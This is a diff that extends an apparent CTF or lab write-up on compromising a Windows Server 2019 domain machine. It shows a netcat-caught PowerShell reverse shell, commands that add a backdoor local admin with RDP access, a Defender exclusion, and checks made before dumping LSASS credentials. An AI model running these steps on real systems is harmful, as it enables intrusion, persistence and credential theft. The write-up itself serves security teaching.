@@ -1435,10 +1435,43 @@ To get a revershell directly to our attacker machine issue the following command
 
 Once executed a nc listener on port 4321, you should get a powershell reverse shell:
 
+    nc -lvp 4321
+    listening on [any] 4321 ...
+    connect to [127.0.0.1] from localhost [127.0.0.1] 40676
+    Windows PowerShell 
+    Copyright (C) Microsoft Corporation. All rights reserved.
     
+    PS C:\web\htdocs\images> 
     
+Since the server has RDP enabled we can create a local admin user:
+
+    net user support Password2@ /add
+    net localgroup administrators support /add
+    net localgroup "Remote Desktop Users" support /add
+
+Then we can proceed to connect to the server with RDP, using Remmina. Then I set a Defender exclusion folder in:
+
+    C:\users\support\music
+
+### Flag submission 
+You can find the flag in the administrator desktop folder.
+
+Now that we compromised a domain machine we can try to get in control of the DC. To do that we need to get at firs the credentials of the domain users. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password, in case of NTLM). But as we known probably credentials guard is in place, since we are on Server 2019. We can verify using the following command in powershell (run as administrator):
+
+    Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
+    ...
+    SecurityServicesConfigured                   : {0}
+    SecurityServicesRunning                      : {0}
+    ...
+Since both 0 are returned for the settings showed above, it means that credentials guard is not enabled. Further more we can verify if we have privilege (we should since we are local admin) to dump LSASS:
+
+     whoami /priv | findstr SeDebug
+        SeDebugPrivilege                          Debug programs                                                     Enabled
 
 
+
+
+    
 
 
 
